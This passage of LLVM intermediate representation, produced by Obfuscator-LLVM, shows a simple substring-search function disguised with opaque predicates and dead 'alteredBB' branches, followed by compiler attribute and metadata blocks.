originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %14, align 8
  store i32 %1, i32* %15, align 4
  store i8* %2, i8** %16, align 8
  store i32 %3, i32* %17, align 4
  store i32 0, i32* %19, align 4
  %20 = load i32, i32* %17, align 4
  %21 = load i32, i32* %15, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = load i32, i32* @x.99
  %24 = load i32, i32* @y.100
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %32

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 -1, i32* %13, align 4
  br label %146

; <label>:32:                                     ; preds = %originalBBpart2
  store i32 0, i32* %18, align 4
  br label %33

; <label>:33:                                     ; preds = %126, %32
  %34 = load i32, i32* @x.99
  %35 = load i32, i32* @y.100
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i32, i32* %18, align 4
  %43 = load i32, i32* %15, align 4
  %44 = icmp slt i32 %42, %43
  %45 = load i32, i32* @x.99
  %46 = load i32, i32* @y.100
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %44, label %53, label %129

; <label>:53:                                     ; preds = %originalBBpart24
  %54 = load i8*, i8** %14, align 8
  %55 = load i32, i32* %18, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds i8, i8* %54, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = sext i8 %58 to i32
  %60 = load i8*, i8** %16, align 8
  %61 = load i32, i32* %19, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp eq i32 %59, %65
  br i1 %66, label %67, label %108

; <label>:67:                                     ; preds = %53
  %68 = load i32, i32* @x.99
  %69 = load i32, i32* @y.100
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %67
  %76 = load i32, i32* %19, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %19, align 4
  %78 = load i32, i32* %17, align 4
  %79 = icmp eq i32 %77, %78
  %80 = load i32, i32* @x.99
  %81 = load i32, i32* @y.100
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart215, label %originalBB6alteredBB

originalBBpart215:                                ; preds = %originalBB6
  br i1 %79, label %88, label %91

; <label>:88:                                     ; preds = %originalBBpart215
  %89 = load i32, i32* %18, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %13, align 4
  br label %146

; <label>:91:                                     ; preds = %originalBBpart215
  %92 = load i32, i32* @x.99
  %93 = load i32, i32* @y.100
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %91
  %100 = load i32, i32* @x.99
  %101 = load i32, i32* @y.100
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br label %109

; <label>:108:                                    ; preds = %53
  store i32 0, i32* %19, align 4
  br label %109

; <label>:109:                                    ; preds = %108, %originalBBpart219
  %110 = load i32, i32* @x.99
  %111 = load i32, i32* @y.100
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %109
  %118 = load i32, i32* @x.99
  %119 = load i32, i32* @y.100
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %126

; <label>:126:                                    ; preds = %originalBBpart223
  %127 = load i32, i32* %18, align 4
  %128 = add nsw i32 %127, 1
  store i32 %128, i32* %18, align 4
  br label %33

; <label>:129:                                    ; preds = %originalBBpart24
  %130 = load i32, i32* @x.99
  %131 = load i32, i32* @y.100
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %129
  store i32 -1, i32* %13, align 4
  %138 = load i32, i32* @x.99
  %139 = load i32, i32* @y.100
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %146

; <label>:146:                                    ; preds = %originalBBpart227, %88, %31
  %147 = load i32, i32* %13, align 4
  ret i32 %147

originalBBalteredBB:                              ; preds = %originalBB, %4
  %148 = alloca i32, align 4
  %149 = alloca i8*, align 8
  %150 = alloca i32, align 4
  %151 = alloca i8*, align 8
  %152 = alloca i32, align 4
  %153 = alloca i32, align 4
  %154 = alloca i32, align 4
  store i8* %0, i8** %149, align 8
  store i32 %1, i32* %150, align 4
  store i8* %2, i8** %151, align 8
  store i32 %3, i32* %152, align 4
  store i32 0, i32* %154, align 4
  %155 = load i32, i32* %152, align 4
  %156 = load i32, i32* %150, align 4
  %157 = icmp sgt i32 %155, %156
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  %158 = load i32, i32* %18, align 4
  %159 = load i32, i32* %15, align 4
  %160 = icmp slt i32 %158, %159
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %67
  %161 = load i32, i32* %19, align 4
  %_ = shl i32 %161, 1
  %_7 = shl i32 %161, 1
  %_8 = shl i32 %161, 1
  %_9 = sub i32 0, %161
  %gen = add i32 %_9, 1
  %_10 = sub i32 %161, 1
  %gen11 = mul i32 %_10, 1
  %_12 = sub i32 %161, 1
  %gen13 = mul i32 %_12, 1
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %19, align 4
  %163 = load i32, i32* %17, align 4
  %164 = icmp eq i32 %162, %163
  br label %originalBB6

originalBB17alteredBB:                            ; preds = %originalBB17, %91
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %109
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %129
  store i32 -1, i32* %13, align 4
  br label %originalBB25
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146816763}
!2 = !{i32 -2146816354}
